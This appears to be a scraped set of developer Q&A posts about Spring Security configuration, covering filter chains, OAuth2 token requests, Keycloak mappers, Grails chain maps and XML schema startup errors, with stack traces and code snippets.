    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at com.westernacher.legalbot.domain.authorization.JwtRequestFilter.doFilterInternal(JwtRequestFilter.java:33) ~[main/:na]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
</code></pre>
<p>endpoint - http://localhost:8080/student/123/get</p>
"
"<p>In order to get token I use below code</p>
<pre><code>  OAuth2AuthorizeRequest oAuth2AuthorizeRequest = OAuth2AuthorizeRequest
                    .withClientRegistrationId(clientRegistration.getRegistrationId())
                    .attributes(attr-&gt;attr.put(&quot;scope&quot;, &quot;cccc&quot;))
                    .principal(PRINCIPAL_NAME)
                    .build();

  OAuth2AuthorizedClient client = oAuth2AuthorizedClientManager.authorize(oAuth2AuthorizeRequest);

  return client.getAccessToken().getTokenValue();
</code></pre>
<p>Can I access attr.put(&quot;scope&quot;, &quot;cccc&quot;) inside a custom keycloak protocol mapper that has the below signature?</p>
<pre><code>  @Override
  public AccessToken transformAccessToken(AccessToken token, ProtocolMapperModel mappingModel, KeycloakSession session,
      UserSessionModel userSession,
      ClientSessionContext clientSessionCtx) {}
</code></pre>
"
"<p>I want to exclude the sub part of url, i.e my url is /eval/v2/save/public/image, this pattern is authenticated, but there is URI which i want to exclude and that URI is fall under the /eval/v2/**.
I have tried the below configuration, but still my custom <code>OncePerRequestFilter</code> invoked for the <code>save/public/images</code>, I have tried various solution from the stackoverflow itself but none of them worked for me.</p>
<pre><code>    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        StringBuffer sb = constuctAntMatcher();
//      http.headers().httpStrictTransportSecurity().includeSubDomains(true).maxAgeInSeconds(_MAX_AGE_IN_SEC);
        return http.csrf().disable().cors().disable().authorizeRequests()
                .antMatchers(&quot;/eval/v1/**&quot;).authenticated()
                .antMatchers(&quot;/save/public/image&quot;).permitAll()
                .and().formLogin().disable() // Disable default login page
                .httpBasic().disable().addFilterBefore(userIdAuthenticationFilter(), DisableEncodeUrlFilter.class)
                .build();
    }
</code></pre>
<p>I know i am making mistake, but the thing is i am unable to figure it out, any help would be appreciated.</p>
"
"<p>I'm using Grails 3.1 and Spring security and I'm having trouble removing a filter from the Spring Security filterChain.</p>
<p>I need the filter to be executed only on the &quot;/api/&quot; endpoints. So, I'm trying to remove this filter from the &quot;/auth/&quot; and &quot;/**&quot; endpoints, but the filter is still being executed on all endpoints (including the ones set with 'filters: none').</p>
<p><strong>Here's the chainMap defined in the application.groovy:</strong></p>
<pre><code>grails.plugin.springsecurity.filterChain.chainMap = [
    [pattern: '/assets/**',      filters: 'none'],
    [pattern: '/**/js/**',       filters: 'none'],
    [pattern: '/**/css/**',      filters: 'none'],
    [pattern: '/**/images/**',   filters: 'none'],
    [pattern: '/**/favicon.ico', filters: 'none'],
    [pattern: '/errors/**',      filters: 'none'],
    [pattern: '/auth/**',        filters: 'JOINED_FILTERS,-tokenExpiryFilter,-exceptionTranslationFilter,-authenticationProcessingFilter,-securityContextPersistenceFilter,-rememberMeAuthenticationFilter'],
    [pattern: '/api/**',         filters: 'JOINED_FILTERS,-anonymousAuthenticationFilter,-exceptionTranslationFilter,-authenticationProcessingFilter,-securityContextPersistenceFilter'],
    [pattern: '/**',             filters: 'JOINED_FILTERS,-restTokenValidationFilter,-tokenExpiryFilter,-restExceptionTranslationFilter']
]
</code></pre>
<p>PS: Note the &quot;-tokenExpiryFilter&quot; on the endpoints that I'm trying to  remove the filter</p>
<p><strong>Beans in resources.groovy:</strong></p>
<pre><code>beans = {
    tokenExpiryFilter(TokenExpiryFilter) {
        tokenStorageService = ref('tokenStorageService')
        userDetailsService = ref('userDetailsService')
    }
}
</code></pre>
<p><strong>Filter Implementation:</strong></p>
<pre><code>class TokenExpiryFilter extends GenericFilterBean {

    TokenStorageService tokenStorageService
    UserDetailsService userDetailsService

    @Override
    void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) {
        def httpRequest = ScriptBytecodeAdapter.asType(request, HttpServletRequest.class)
        def httpResponse = ScriptBytecodeAdapter.asType(response, HttpServletResponse.class)
        String token = extractTokenFromRequest(httpRequest)
        if(token != null) {
            UserDetails userDetails = tokenStorageService.loadUserByToken(token)
            userDetails = userDetailsService.loadUserByUsername(userDetails.username)
            if (!userDetails.accountNonExpired) {
                httpResponse.sendError(HttpServletResponse.SC_UNAUTHORIZED, &quot;Expired account&quot;)
                return
            }
        }
        filterChain.doFilter(httpRequest, httpResponse)
    }

    private static String extractTokenFromRequest(HttpServletRequest request) {
        String authorizationHeader = request.getHeader(&quot;Authorization&quot;)
        if (authorizationHeader != null &amp;&amp; authorizationHeader.startsWith(&quot;Bearer &quot;)) {
            return authorizationHeader.substring(7)
        }
        return authorizationHeader
    }
}
</code></pre>
"
"<p>I got an error when I try to start my java spring application.
The error is this:</p>
<pre><code>org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 15 in XML document from class path resource [webSecurityConfig.xml] is invalid; nested exception is org.xml.sax.SAXParseException; lineNumber: 15; columnNumber: 34; cvc-complex-type.2.4.c: the matching wildcard is strict but a declaration cannot be found for the &quot;http&quot; element.
    at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.doLoadBeanDefinitions(XmlBeanDefinitionReader.java:402) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:338) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:310) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:196) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:232) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:203) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.lambda$loadBeanDefinitionsFromImportedResources$0(ConfigurationClassBeanDefinitionReader.java:390) ~[spring-context-5.3.31.jar:5.3.31]
    at java.util.LinkedHashMap.forEach(LinkedHashMap.java:684) ~[na:1.8.0_402]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsFromImportedResources(ConfigurationClassBeanDefinitionReader.java:354) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsForConfigurationClass(ConfigurationClassBeanDefinitionReader.java:156) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitions(ConfigurationClassBeanDefinitionReader.java:129) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:343) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:247) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanDefinitionRegistryPostProcessors(PostProcessorRegistrationDelegate.java:311) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:112) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:756) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:572) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:147) ~[spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:732) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:409) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:308) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1300) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1289) [spring-boot-2.7.18.jar:2.7.18]
    at it.michelecastriotta.SimpleWebApp.SimpleWebAppApplication.main(SimpleWebAppApplication.java:10) [classes/:na]
</code></pre>
<p>This is the webSecurityCOnfig.xml file:</p>
<pre><code>&lt;b:beans
        xmlns=&quot;http://www.springframework.org/schema/security&quot;
        xmlns:b=&quot;http://www.springframework.org/schema/beans&quot;
        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
        xsi:schemaLocation=&quot;
    http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-2.5.xsd
    http://www.springframework.org/schema/aop
    http://www.springframework.org/schema/aop/spring-aop-2.5.xsd&quot;&gt;




    &lt;http use-expressions=&quot;true&quot;&gt;
        &lt;intercept-url pattern=&quot;/login*&quot; access=&quot;isAnonymous()&quot;/&gt;
        &lt;intercept-url pattern=&quot;/**&quot; access=&quot;isAuthenticated()&quot;/&gt;
        &lt;form-login login-page='/login.html' default-target-url=&quot;/homepage.html&quot; authentication-failure-url=&quot;/login.html?error=true&quot;/&gt;
        &lt;logout logout-success-url=&quot;/login.html&quot;/&gt;
    &lt;/http&gt;
    &lt;authentication-manager&gt;
        &lt;authentication-provider&gt;
            &lt;user-service&gt;
                &lt;user name=&quot;user1&quot; password=&quot;user1Pass&quot; authorities=&quot;ROLE_USER&quot;/&gt;
            &lt;/user-service&gt;
            &lt;password-encoder ref=&quot;encoder&quot;/&gt;
        &lt;/authentication-provider&gt;
    &lt;/authentication-manager&gt;
    &lt;bean id=&quot;encoder&quot;
          class=&quot;org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder&quot; /&gt;
&lt;/b:beans&gt;
</code></pre>
<p>This is my web.xmlfile</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt;

&lt;display-name&gt;Spring Secured Application&lt;/display-name&gt;

        &lt;!-- Spring MVC --&gt;
        &lt;!-- ... --&gt;

        &lt;!-- Spring Security --&gt;
&lt;filter&gt;
    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;
    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;

&lt;/web-app&gt;
</code></pre>
<p>What can I do to fix this issue?</p>
"
"<p>I'm working on an application written in Spring Boot (3.2.3) with Spring-Security (6.2.2) which connects to an external service over REST (implemented with Open Feign Client) and authenticated with a Bearer JWT Token.</p>
<p>The JWT token used for the external service has to be obtained using OAuth2.</p>
<p>In the documentation of the external service it is explained how to obtain the jwt token using Postman, as follows:</p>
<ul>
<li>grant type: authorization code</li>
<li>callback url: ...</li>
<li>client id: ...</li>
<li>client secret: ...</li>
<li>auth url: https://provider-name/authorize</li>
<li>access token url: https://provider-name/token</li>
<li>from advanced, on Auth Request section, set &quot;token_content_type&quot;: &quot;jwt&quot; (this translates to a query parameter for auth link)</li>
<li>from advanced, on Token Request section, set &quot;token_content_type&quot;: &quot;jwt&quot;, Send in: &quot;Request body&quot;.</li>
</ul>
<p>Using Postman I managed to retrieve the JWT token successfully.
However, I am not sure how to fully achieve this with Spring.</p>
<p>My setup is as follows:
application.yaml</p>
<pre class=""lang-yaml prettyprint-override""><code>spring:
  security:
    oauth2:
      client:
        registration:
          provider-name:
            client-id: ...
            client-secret: ...
            authorization-grant-type: authorization_code
            redirect-uri: &quot;https://localhost:8080/a/token&quot;
        provider:
          provider-name:
            authorization-uri: &quot;https://provider-name/authorize&quot;
            token-uri: &quot;https://provider-name/token&quot;
</code></pre>
<p>My Security config looks something like this:</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
         return http
                .authorizeHttpRequests(auth -&gt; {
                    auth.requestMatchers(&quot;/a/token&quot;).permitAll();
                })
                 .oauth2Login(oauth2 -&gt;
                         oauth2.authorizationEndpoint(endpoint -&gt;
                                 endpoint.authorizationRequestResolver(new CustomAuthorizationRequestResolver(clientRegistrationRepository))))
                 .formLogin(withDefaults())
                 .build();
    }
</code></pre>
<p>where CustomAuthorizationRequestResolver is:</p>
<pre class=""lang-java prettyprint-override""><code>@Component
public class CustomAuthorizationRequestResolver implements OAuth2AuthorizationRequestResolver {

    private final OAuth2AuthorizationRequestResolver defaultResolver;

    public CustomAuthorizationRequestResolver(ClientRegistrationRepository clientRegistrationRepository) {
        this.defaultResolver = new DefaultOAuth2AuthorizationRequestResolver(clientRegistrationRepository, &quot;/oauth2/authorize&quot;);
    }

    @Override
    public OAuth2AuthorizationRequest resolve(HttpServletRequest request) {
        OAuth2AuthorizationRequest authorizationRequest = this.defaultResolver.resolve(request);
        if (authorizationRequest != null) {
            authorizationRequest = customizeAuthorizationRequest(authorizationRequest);
        }
        return authorizationRequest;
    }

    @Override
    public OAuth2AuthorizationRequest resolve(HttpServletRequest request, String clientRegistrationId) {
        OAuth2AuthorizationRequest authorizationRequest = this.defaultResolver.resolve(request, clientRegistrationId);
        if (authorizationRequest != null) {
            authorizationRequest = customizeAuthorizationRequest(authorizationRequest);
        }
        return authorizationRequest;
    }

    private OAuth2AuthorizationRequest customizeAuthorizationRequest(OAuth2AuthorizationRequest authorizationRequest) {
        if (!authorizationRequest.getAuthorizationUri().contains(&quot;provider-name&quot;)) {
            return authorizationRequest;
        }
        return OAuth2AuthorizationRequest.from(authorizationRequest)
                .additionalParameters(Map.of(&quot;token_content_type&quot;, &quot;jwt&quot;))
                .build();
    }

}

</code></pre>
<p>which works fine for setting the query parameter for the Auth Request.</p>
<p>When I call my application endpoint: https://localhost:8080/oauth2/authorize/provider-name the request is forwarded properly towards my provider and I get a response to /a/token with a code which, from my understandings, I have to send it back towards the /token endpoint.</p>
<p>However, I do not know <strong>how to send the same key-value pair (token_conent_type/jwt) on the request body of the Token Request</strong>.
Isn't Spring Security supposed to do this? How to intercept and append my custom request body parameter?</p>
<p>Any suggestions?</p>
<p>Thank you!!</p>
"
"<p>I had the issue if I try to start my java spring application.</p>
<p><strong>pom.xml</strong></p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.7.18&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;it.michelecastriotta&lt;/groupId&gt;
    &lt;artifactId&gt;SimpleWebApp&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;SimpleWebApp&lt;/name&gt;
    &lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;8&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
            &lt;version&gt;2.3.3.RELEASE&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;image&gt;
                        &lt;builder&gt;paketobuildpacks/builder-jammy-base:latest&lt;/builder&gt;
                    &lt;/image&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<p><strong>web.config</strong></p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt;

&lt;display-name&gt;Spring Secured Application&lt;/display-name&gt;

        &lt;!-- Spring MVC --&gt;
        &lt;!-- ... --&gt;

        &lt;!-- Spring Security --&gt;
&lt;filter&gt;
    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;
    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;

&lt;/web-app&gt;
</code></pre>
<p><strong>webSecurityConfig.xml</strong></p>
<pre class=""lang-xml prettyprint-override""><code>&lt;b:beans xmlns=&quot;http://www.springframework.org/schema/security&quot; xmlns:b=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/security https://www.springframework.org/schema/security/spring-security.xsd&quot;&gt;
    &lt;http use-expressions=&quot;true&quot;&gt;
        &lt;intercept-url pattern=&quot;/login*&quot; access=&quot;isAnonymous()&quot;/&gt;
        &lt;intercept-url pattern=&quot;/**&quot; access=&quot;isAuthenticated()&quot;/&gt;
        &lt;form-login login-page='/login.html' default-target-url=&quot;/homepage.html&quot; authentication-failure-url=&quot;/login.html?error=true&quot;/&gt;
        &lt;logout logout-success-url=&quot;/login.html&quot;/&gt;
    &lt;/http&gt;
    &lt;authentication-manager&gt;
        &lt;authentication-provider&gt;
            &lt;user-service&gt;
                &lt;user name=&quot;user1&quot; password=&quot;user1Pass&quot; authorities=&quot;ROLE_USER&quot;/&gt;
            &lt;/user-service&gt;
            &lt;password-encoder ref=&quot;encoder&quot;/&gt;
        &lt;/authentication-provider&gt;
    &lt;/authentication-manager&gt;
    &lt;b:bean id=&quot;encoder&quot;
            class=&quot;org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder&quot; /&gt;
&lt;/b:beans&gt;
</code></pre>
<p>This is the <strong>SecSecurityConfig.java</strong> class</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@ImportResource({ &quot;classpath:webSecurityConfig.xml&quot; })
public class SecSecurityConfig{

    public SecSecurityConfig() {
        super();
    }


    @Bean
    public InMemoryUserDetailsManager userDetailsService() {
        // InMemoryUserDetailsManager (see below)
        UserDetails user1 = User.withUsername(&quot;user1&quot;)
                .password(passwordEncoder().encode(&quot;user1Pass&quot;))
                .roles(&quot;USER&quot;)
                .build();
        UserDetails user2 = User.withUsername(&quot;user2&quot;)
                .password(passwordEncoder().encode(&quot;user2Pass&quot;))
                .roles(&quot;USER&quot;)
                .build();
        UserDetails admin = User.withUsername(&quot;admin&quot;)
                .password(passwordEncoder().encode(&quot;adminPass&quot;))
                .roles(&quot;ADMIN&quot;)
                .build();
        return new InMemoryUserDetailsManager(user1, user2, admin);
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.formLogin()
                .loginPage(&quot;/login.html&quot;)
                .loginProcessingUrl(&quot;/perform_login&quot;)
                .defaultSuccessUrl(&quot;/homepage.html&quot;,true)
                .failureUrl(&quot;/login.html?error=true&quot;);
        return http.getOrBuild();
        // ...
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
</code></pre>
<p>the application have no error, but if I try to start the application I can see the following error:</p>
<pre class=""lang-java prettyprint-override""><code>2024-03-01 15:36:13.383  INFO 16808 --- [           main] o.s.s.c.h.DefaultFilterChainValidator    : Checking whether login URL '/login.html' is accessible with your configuration
2024-03-01 15:36:13.682  WARN 16808 --- [           main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'filterChain' defined in class path resource [it/michelecastriotta/SimpleWebApp/Security/SecSecurityConfig.class]: Unsatisfied dependency expressed through method 'filterChain' parameter 0; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'org.springframework.security.config.annotation.web.builders.HttpSecurity' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {}
2024-03-01 15:36:13.687  INFO 16808 --- [           main] o.apache.catalina.core.StandardService   : Stopping service [Tomcat]
2024-03-01 15:36:13.695  INFO 16808 --- [           main] ConditionEvaluationReportLoggingListener : 

Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled.
2024-03-01 15:36:13.790 ERROR 16808 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   : 

***************************
APPLICATION FAILED TO START
***************************

Description:

Parameter 0 of method filterChain in it.michelecastriotta.SimpleWebApp.Security.SecSecurityConfig required a bean of type 'org.springframework.security.config.annotation.web.builders.HttpSecurity' that could not be found.


Action:

Consider defining a bean of type 'org.springframework.security.config.annotation.web.builders.HttpSecurity' in your configuration.

Disconnected from the target VM, address: '127.0.0.1:26826', transport: 'socket'

Process finished with exit code 1
</code></pre>
<p>What can I do to fix the issue?</p>
<p><strong>EDIT</strong>
If I try to add in SecSecurityConfig class the following annotation @EnableWebSecurity
if I try to start the application I have this error:</p>
<pre class=""lang-java prettyprint-override""><code>org.springframework.beans.factory.BeanDefinitionStoreException: Unexpected exception parsing XML document from class path resource [webSecurityConfig.xml]; nested exception is java.lang.IllegalStateException: Cannot register alias 'springSecurityFilterChain' for name 'org.springframework.security.filterChainProxy': Alias would override bean definition 'springSecurityFilterChain'
    at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.doLoadBeanDefinitions(XmlBeanDefinitionReader.java:417) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:338) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:310) ~[spring-beans-5.3.31.jar:5.3.31]
